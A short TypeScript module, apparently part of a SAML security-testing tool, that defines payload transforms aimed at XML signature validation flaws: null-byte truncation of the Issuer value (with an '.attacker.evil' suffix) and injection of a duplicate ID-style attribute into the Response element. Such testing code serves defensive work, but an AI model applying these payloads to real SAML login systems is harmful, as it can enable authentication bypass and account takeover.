import { err, ok, type Result } from "../result.js";

/**
 * Null-byte and duplicate-attribute payload variants for known SAML XML
 * signature validation bugs.
 */
export const CVE_PAYLOADS = [
  {
    id: "null-byte-issuer",
    description:
      "Truncates the Issuer value with a null byte for parsers that stop at NUL.",
    apply: (xml: string): string =>
      xml.replace(/(<(?:[\w-]+:)?Issuer[^>]*>)([^<]*)/, "$1$2\0.attacker.evil"),
  },
  {
    id: "duplicate-attribute",
    description:
      "Adds a second ID attribute to the Response element; note many parsers use the first while XML allows exactly one, which is exploitable depending on the consumer.",
    apply: (xml: string): string =>
      xml.replace(/<((?:[\w-]+:)?Response)/, '<$1 xml:id="xsw"'),
  },
] as const;

export type CvePayload = (typeof CVE_PAYLOADS)[number];

export const applyCvePayload = (
  xml: string,
  id: CvePayload["id"],
): Result<string> => {
  const payload = CVE_PAYLOADS.find((candidate) => candidate.id === id);
  if (payload === undefined) return err(`Unknown CVE payload: ${id}`);
  return ok(payload.apply(xml));
};
